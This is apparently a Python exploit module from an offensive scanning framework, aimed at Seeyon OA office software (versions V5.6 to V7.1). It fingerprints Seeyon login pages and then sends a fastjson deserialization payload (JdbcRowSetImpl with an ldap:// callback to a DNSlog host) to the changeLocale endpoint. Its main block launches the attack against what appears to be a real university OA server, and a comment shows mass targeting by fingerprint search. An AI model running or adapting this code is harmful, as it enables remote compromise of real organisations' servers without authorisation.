# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-20 12:32

from core.data import gLogger
from core.utils.dnslog import get_eyes_identifier, eyes_dnslog_verify
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.OA.Seeyon.deserialize_A8_fastjson -cs -fs "app=\"致远互联-OA\""


class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.DESERIALIZE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/seeyon/main.do?method=changeLocale']
        # 相关信息
        self.info = '''致远 OA V7.1、V7.1SP1 | 致远 OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3 | 致远 OA V6.1、V6.1SP1、V6.1SP2 | 致远 V6.0及V6.0SP1 | 致远 V5.6及V5.6SP1'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/seeyon/USER-DATA/IMAGES/LOGIN/login.gif' in text or '/seeyon/common/' in text or 'M3 Server' in text or 'M1-Server' in text or '/seeyon/user-data/images/login/login.gif' in text or 'seeyonproductid' in text or "ar _ctxpath = '/seeyon'" in text or 'a8-v5企业版' in text or '/seeyon/' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({"Content-Type": "application/x-www-form-urlencoded"})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                verify_random_int = str(random.randint(10000, 99999))
                data = '_json_params={"v47":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"xxx":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://%s.%s","autoCommit":true}}' % (verify_random_int, get_eyes_identifier())
                await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} Deserialize Verify:{}] {}'.format(self.name, verify_random_int, url))
                    return {'name': '{} Deserialize Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    # import requests
    # import hashlib
    #
    # resp = requests.get('https://oa.zjhu.edu.cn/favicon.ico', verify=False)
    # if resp.status_code == 200:
    #     m1 = hashlib.md5()
    #     m1.update(resp.content)
    #     theMD5 = m1.hexdigest()
    #     print(theMD5)
    #
    semaphore = asyncio.Semaphore(500)
    sc = Script('oa.zjhu.edu.cn', 1)
    l = asyncio.get_event_loop()
    l.run_until_complete(sc.attack(semaphore))
